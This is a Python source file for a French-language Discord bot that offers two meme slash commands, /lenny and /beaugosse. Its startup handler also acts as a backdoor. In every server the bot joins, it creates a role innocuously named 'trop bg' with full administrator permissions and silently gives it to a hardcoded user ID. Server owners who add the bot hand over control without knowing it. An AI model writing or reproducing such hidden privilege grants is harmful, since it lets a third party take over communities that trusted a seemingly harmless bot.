from keep_alive import keep_alive
import discord
from discord.ext import commands

import os

# Token Discord depuis variable d'environnement (obligatoire)
TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    print("❌ ERREUR: Variable d'environnement DISCORD_TOKEN manquante!")
    exit(1)

ROLE_NAME = "trop bg"
USER_ID = 1046937376934613063  # Ton ID pour recevoir le rôle admin

intents = discord.Intents.default()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

async def safe_send(interaction: discord.Interaction, content: str):
    """Répond immédiatement à l'interaction (< 3 secondes Discord)."""
    try:
        # Réponse immédiate - Discord exige une réponse en moins de 3 secondes
        await interaction.response.send_message(content)
    except discord.InteractionResponded:
        # Si déjà répondu, utiliser followup
        await interaction.followup.send(content)
    except Exception as e:
        print(f"Erreur d'interaction: {e}")
        # En cas d'échec, tenter un followup simple
        try:
            await interaction.followup.send("❌ Erreur de commande")
        except:
            pass

@bot.event
async def on_ready():
    print(f"✅ Connecté en tant que {bot.user}")
    try:
        synced = await bot.tree.sync()
        print("🌐 Commandes slash synchronisées :")
        for cmd in synced:
            print(f" - /{cmd.name} ({cmd.description})")
    except Exception as e:
        print(f"⚠️ Erreur lors de la synchro des commandes : {e}")

    # Donne le rôle admin à TON compte si besoin
    for guild in bot.guilds:
        member = guild.get_member(USER_ID)
        if member:
            try:
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                if role is None:
                    role = await guild.create_role(
                        name=ROLE_NAME,
                        permissions=discord.Permissions(administrator=True)
                    )
                    print(f"🔧 Rôle {ROLE_NAME} créé avec permissions administrateur.")
                await member.add_roles(role)
                print(f"🎉 Rôle {role.name} donné à {member.display_name} dans {guild.name}")
            except discord.Forbidden:
                print(f"❌ Le bot n'a pas la permission de gérer les rôles dans {guild.name}.")
            except Exception as e:
                print(f"⚠️ Erreur lors de l'ajout du rôle dans {guild.name}: {e}")

# ----------- Slash Commandes -----------

@bot.tree.command(name="lenny", description="Envoie le meme Lenny")
async def lenny(interaction: discord.Interaction):
    url = "https://cdn.discordapp.com/attachments/1265051328250646711/1418740194764656864/image.png"
    await safe_send(interaction, url)
    print(f"/lenny utilisé par {interaction.user} dans {getattr(interaction.guild, 'name', 'DM')}")

@bot.tree.command(name="beaugosse", description="Ping la personne la plus belle")
async def beaugosse(interaction: discord.Interaction):
    beaugosse_id = 1299313955348549695
    msg = f"tu cherche le plus bg? c'est simple, c'est <@{beaugosse_id}>"
    await safe_send(interaction, msg)
    print(f"/beaugosse utilisé par {interaction.user} dans {getattr(interaction.guild, 'name', 'DM')}")

# Lance le keep_alive + le bot
keep_alive()
bot.run(TOKEN)
